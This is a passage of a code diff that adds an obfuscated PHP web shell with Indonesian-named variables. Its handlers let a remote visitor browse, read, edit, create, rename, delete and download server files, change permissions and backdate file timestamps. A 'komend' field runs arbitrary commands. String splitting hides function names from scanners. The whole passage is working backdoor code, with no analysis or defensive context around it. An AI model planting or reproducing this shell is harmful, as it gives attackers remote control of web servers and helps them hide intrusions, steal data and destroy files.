+	echo "<pre>".$hsc($fgt($_GET['lokasie']))."</pre>";
+	author();
+} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "hapus") {
+	if ($idi($_POST['loknya']) && $fxt($_POST['loknya'])) {
+		xrd($_POST['loknya']);
+		if ($fxt($_POST['loknya'])) { red("Fai"."led to del"."ete D"."ir"."ec"."tory !"); } else { green("Del"."ete Di"."r"."ect"."ory Suc"."cess !"); }
+	} elseif ($ifi($_POST['loknya']) && $fxt($_POST['loknya'])) {
+		@$ulk($_POST['loknya']);
+		if ($fxt($_POST['loknya'])) { red("Fa"."il"."ed to Delete Fi"."le !"); } else { green("De"."le"."te Fi"."le Succ"."ess !"); }
+	} else { red("Fi"."le / Di"."r"."ecto"."ry not Fo"."und !"); }
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
+	if (!isset($_POST['cemod'])) {
+		if ($_POST['ty'.'pe'] == "fi"."le") { echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>"; } else { echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>"; }
+		echo '<form method="post">Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" /><input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="ubahmod">';
+		if ($_POST['ty'.'pe'] == "fi"."le") { echo '<input type="hidden" name="type" value="fi'.'le">'; } else { echo '<input type="hidden" name="type" value="di'.'r">'; }
+		echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/></form><br>';
+	} else {
+		$cm = @$chm($_POST['loknya'], $ocd($_POST['perm']));
+		if ($cm == true) {
+			green("Change Mod Su"."cc"."ess !");
+			if ($_POST['ty'.'pe'] == "fi"."le") { echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>"; } else { echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>"; }
+			echo '<form method="post">Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" /><input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="ubahmod">';
+			if ($_POST['ty'.'pe'] == "fi"."le") { echo '<input type="hidden" name="type" value="fi'.'le">'; } else { echo '<input type="hidden" name="type" value="di'.'r">'; }
+			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/></form><br>';
+		} else {
+			red("Change Mod Fa"."il"."ed !");
+			if ($_POST['ty'.'pe'] == "fi"."le") { echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>"; } else { echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>"; }
+			echo '<form method="post">Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" /><input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="ubahmod">';
+			if ($_POST['ty'.'pe'] == "fi"."le") { echo '<input type="hidden" name="type" value="fi'.'le">'; } else { echo '<input type="hidden" name="type" value="di'.'r">'; }
+			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/></form><br>';
+		}
+	}
+} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahnama") {
+	if (isset($_POST['gantin'])) {
+		$namabaru = $_GET['loknya']."/".$_POST['newname']; $ceen = "re"."na"."me";
+		if (@$ceen($_POST['loknya'], $namabaru) === true) {
+			green("Change Name Su"."cc"."ess");
+			if ($_POST['ty'.'pe'] == "fi"."le") { echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>"; } else { echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>"; }
+			echo '<form method="post">New Name : <input name="newname" type="text" class="up" size="20" value="'.$hsc($_POST['newname']).'" /><input type="hidden" name="loknya" value="'.$_POST['newname'].'"><input type="hidden" name="pilih" value="ubahnama">';
+			if ($_POST['ty'.'pe'] == "fi"."le") { echo '<input type="hidden" name="type" value="fi'.'le">'; } else { echo '<input type="hidden" name="type" value="di'.'r">'; }
+			echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/></form><br>';
+		} else { red("Change Name Fa"."il"."ed"); }
+	} else {
+		if ($_POST['ty'.'pe'] == "fi"."le") { echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>"; } else { echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>"; }
+		echo '<form method="post">New Name : <input name="newname" type="text" class="up" size="20" value="'.$hsc($bsn($_POST['loknya'])).'" /><input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="ubahnama">';
+		if ($_POST['ty'.'pe'] == "fi"."le") { echo '<input type="hidden" name="type" value="fi'.'le">'; } else { echo '<input type="hidden" name="type" value="di'.'r">'; }
+		echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/></form><br>';
+	}
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
+	if (isset($_POST['gasedit'])) {
+		$content = $_POST['src'];
+		if (strlen($content) == 0) { red("Ed"."it Fi"."le Fai"."led — 0KB !"); } else {
+			$edit = @$fpt($_POST['loknya'], $content);
+			if ($fgt($_POST['loknya']) == $content) { green("Ed"."it Fi"."le Suc"."ce"."ss !"); } else { red("Ed"."it Fi"."le Fai"."led !"); }
+		}
+	}
+	echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br><br>";
+	echo '<form method="post"><textarea cols=80 rows=20 name="src">'.$hsc($fgt($_POST['loknya'])).'</textarea><br><input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="ed'.'it"><input type="submit" value="Ed'.'it Fi'.'le" name="gasedit" class="up" style="cursor: pointer; border-color: #fff"/></form><br>';
+} elseif (isset($_POST['komends'])) {
+	if (isset($_POST['komend'])) {
+		if (isset($_GET['loknya'])) { $lk = $_GET['loknya']; } else { $lk = $gcw(); }
+		$km = 'ko'.'me'.'nd'; echo $km($_POST['komend'], $lk); exit();
+	}
+} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahtanggal") {
+	if (isset($_POST['tanggale'])) {
+		$stt = "st"."rtot"."ime"; $tch = "t"."ou"."ch"; $tanggale = $stt($_POST['tanggal']);
+		if (@$tch($_POST['loknya'], $tanggale) === true) {
+			green("Change Da"."te Succ"."ess !");
+			$det = "da"."te"; $ftm = "fi"."le"."mti"."me"; $b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
+			if ($_POST['ty'.'pe'] == "fi"."le") { echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>"; } else { echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>"; }
+			echo '<form method="post">New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" /><input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="ubahtanggal">';
+			if ($_POST['ty'.'pe'] == "fi"."le") { echo '<input type="hidden" name="type" value="fi'.'le">'; } else { echo '<input type="hidden" name="type" value="di'.'r">'; }
+			echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/></form><br>';
+		} else { red("Fai"."led to Cha"."nge Da"."te !"); }
+	} else {
+		$det = "da"."te"; $ftm = "fi"."le"."mti"."me"; $b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
+		if ($_POST['ty'.'pe'] == "fi"."le") { echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>"; } else { echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>"; }
+		echo '<form method="post">New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" /><input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="ubahtanggal">';
+		if ($_POST['ty'.'pe'] == "fi"."le") { echo '<input type="hidden" name="type" value="fi'.'le">'; } else { echo '<input type="hidden" name="type" value="di'.'r">'; }
+		echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/></form><br>';
+	}
+} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "dunlut") {
+	$dunlute = $_POST['loknya'];
+	if ($fxt($dunlute) && isset($dunlute)) {
+		if ($ird($dunlute)) { dunlut($dunlute); } elseif ($idr($fl)) { red("That is Di"."rec"."tory, Not Fi"."le -_-"); } else { red("Fi"."le is Not Re"."adab"."le !"); }
+	} else { red("Fi"."le Not Fo"."und !"); }
+} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "fo"."ld"."er") {
+    if ($isw("./") || $ird("./")) {
+        $loke = $_POST['loknya'];
+        if (isset($_POST['buatfol'.'der'])) {
+            $buatf = $mkd($loke."/".$_POST['fo'.'lde'.'rba'.'ru']);
+            if ($buatf == true) {
+                green("Fol"."der <b>".$hsc($_POST['fo'.'lde'.'rba'.'ru'])."</b> Created !");
+                echo '<form method="post"><center>Fo'.'lde'.'r : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatFo'.'lde'.'r" value="Create Fo'.'lde'.'r" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="Fo'.'lde'.'r"></form>';
+            } else {
+                red("Fa"."il"."ed to Create fol"."der !");
+                echo '<form method="post"><center>Fo'.'lde'.'r : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatFo'.'lde'.'r" value="Create Fo'.'lde'.'r" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+                echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="Fo'.'lde'.'r"></form>';
+            }
+        } else {
+            echo '<form method="post"><center>Fo'.'lde'.'r : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatFo'.'lde'.'r" value="Create Fo'.'lde'.'r" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+            echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="Fo'.'lde'.'r"></form>';
+        }
+    }
+} elseif (isset($_POST['lok'.'nya']) && $_POST['pilih'] == "fi"."le") {
+    if ($isw("./") || $isr("./")) {
+        $loke = $_POST['lok'.'nya'];
+        if (isset($_POST['buatfi'.'le'])) {
+            $buatf = $fpt($loke."/".$_POST['fi'.'lebaru'], "");
+            if ($fxt($loke."/".$_POST['fi'.'lebaru'])) {
+                green("File <b>".$hsc($_POST['fi'.'lebaru'])."</b> Created !");
+                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create Fi'.'le" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
+            } else {
+                red("Fa"."il"."ed to Create Fi"."le !");
+                echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+                echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
+            }
+        } else {
+            echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
+            echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';
+        }
+    }
+}
+
+// ============================================================
+// FILE LIST
+// ============================================================
+echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr class="first"><td><center>Na'.'me</center></td><td><center>Si'.'ze</center></td><td><center>Las'.'t Mo'.'dif'.'ied</center></td><td><center>Owner / Group</center></td><td><center>Pe'.'rmi'.'ss'.'ions</center></td><td><center>Op'.'tio'.'ns</center></td></tr>';
+
+echo "<tr>";
+$euybrekw = $srl($bsn($lokasi), "", $lokasi); $euybrekw = $srl("//", "/", $euybrekw);
+echo "<td><i class='fa fa-fol"."der' style='color: #ffe9a2'></i> <a href=\"?loknya=".$euybrekw."\">..</a></td>
+<td><center>--</center></td><td><center>".fdt($euybrekw)."</center></td>
+<td><center>".gor($euybrekw)." / ".ggr($euybrekw)."</center></td>
+<td><center>"; if($isw($euybrekw)) echo '<font color="green">'; elseif(!$isr($euybrekw)) echo '<font color="red">'; echo statusnya($euybrekw); if($isw($euybrekw) || !$isr($euybrekw)) echo '</font>'; echo "</center></td>
+<td><center><form method=\"POST\" action=\"?pilihan&loknya=$lokasi\">
+<input type=\"hidden\" name=\"type\" value=\"d"."ir\"><input type=\"hidden\" name=\"loknya\" value=\"$lokasi/\">
+<button type='submit' class='btf' name='pilih' value='fol"."der'><i class='fa fa-fol"."der' style='color: #fff'></i></button>
+<button type='submit' class='btf' name='pilih' value='file'><i class='fa fa-file' style='color: #fff'></i></button>
+</form></center>"; echo "</tr>";
+
+foreach($lokasinya as $ppkcina){
+	$euybre = $lokasi."/".$ppkcina; $euybre = $srl("//", "/", $euybre);
+	if(!$idi($euybre) || $ppkcina == '.' || $ppkcina == '..') continue;
+	echo "<tr><td><i class='fa fa-fol"."der' style='color: #ffe9a2'></i> <a href=\"?loknya=".$euybre."\">".$ppkcina."</a></td>
+	<td><center>--</center></td><td><center>".fdt($euybre)."</center></td>
+	<td><center>".gor($euybre)." / ".ggr($euybre)."</center></td>
+	<td><center>"; if($isw($euybre)) echo '<font color="green">'; elseif(!$isr($euybre)) echo '<font color="red">'; echo statusnya($euybre); if($isw($euybre) || !$isr($euybre)) echo '</font>'; echo "</center></td>
+	<td><center><form method=\"POST\" action=\"?pilihan&loknya=$lokasi\">
+	<input type=\"hidden\" name=\"type\" value=\"di"."r\"><input type=\"hidden\" name=\"name\" value=\"$ppkcina\"><input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$ppkcina\">
+	<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
+	<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
+	<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
+	<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
+	</form></center></td></tr>";
+}
+
+echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
+$skd = "10"."24";
+foreach($lokasinya as $mekicina) {
+	$euybray = $lokasi."/".$mekicina;
+	if(!$ifi("$lokasi/$mekicina")) continue;
+	$size = $fsz("$lokasi/$mekicina")/$skd; $size = $rd($size,3);
+	if($size >= $skd){ $size = $rd($size/$skd,2).' M'.'B'; } else { $size = $size.' K'.'B'; }
+	echo "<tr><td>".cfn($euybray)." <a href=\"?lokasie=$lokasi/$mekicina&loknya=$lokasi\">$mekicina</a></td>
+	<td><center>".$size."</center></td><td><center>".fdt($euybray)."</center></td>
+	<td><center>".gor($euybray)." / ".ggr($euybray)."</center></td>
+	<td><center>"; if($isw("$lokasi/$mekicina")) echo '<font color="green">'; elseif(!$isr("$lokasi/$mekicina")) echo '<font color="red">'; echo statusnya("$lokasi/$mekicina"); if($isw("$lokasi/$mekicina") || !$isr("$lokasi/$mekicina")) echo '</font>'; echo "</center></td>
+	<td><center><form method=\"post\" action=\"?pilihan&loknya=$lokasi\">
+	<button type='submit' class='btf' name='pilih' value='edit'><i class='fa fa-edit' style='color: #fff'></i></button>
+	<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
+	<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
+	<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
+	<button type='submit' class='btf' name='pilih' value='dunlut'><i class='fa fa-down"."load' style='color: #fff'></i></button>
+	<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
+	<input type=\"hidden\" name=\"type\" value=\"fi"."le\"><input type=\"hidden\" name=\"name\" value=\"$mekicina\"><input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$mekicina\">
+	</form></center></td></tr>";
+}
+echo '</tr></td></table></table>';
+author();
+
+function statusnya($fl){ $a = "sub"."st"."r"; $b = "s"."pri"."ntf"; $c = "fil"."eper"."ms"; $izin = $a($b('%o', $c($fl)), -4); return $izin; }
+?>
+
+
